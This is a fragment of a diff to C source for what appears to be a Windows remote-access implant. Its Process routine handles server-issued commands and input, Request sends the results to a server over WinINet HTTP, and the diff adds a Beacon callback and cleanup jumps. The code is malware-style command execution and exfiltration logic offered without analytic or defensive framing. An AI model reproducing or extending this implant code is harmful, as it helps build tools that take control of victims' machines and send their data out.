@@ -8,6 +8,7 @@
 #define patch_length 2
 
 void Request(); // I need to develop actual header files just ignore this for now so that gcc can be quiet
+void Beacon();
 
 struct {
     struct {
@@ -186,6 +187,8 @@ void Process(CHAR* command, CHAR* input) {
 
             // Send request to server
             Request();
+
+            goto cleanup;
         }
 
     // Clean up memory
@@ -195,6 +198,7 @@ void Process(CHAR* command, CHAR* input) {
         free(input);
         free(command_input);
         free(output);
+        Beacon(); // This should be return but return is crashing so :shrug:
 }
 
 void Request() {
@@ -239,6 +243,10 @@ void Request() {
         HttpAddRequestHeadersA(hRequest, wurm.data.length, -1, HTTP_ADDREQ_FLAG_ADD); // Set content-length header 
         if (HttpSendRequestA(hRequest, 0, 0, wurm.data.buffer, wurm.data.size) == FALSE) {
             printf("Error: %lu\n", dw_error);
+            goto cleanup;
+        }
+
+        if (strcmp(wurm.data.status, "output") == 0) {
             goto cleanup;
         }
 
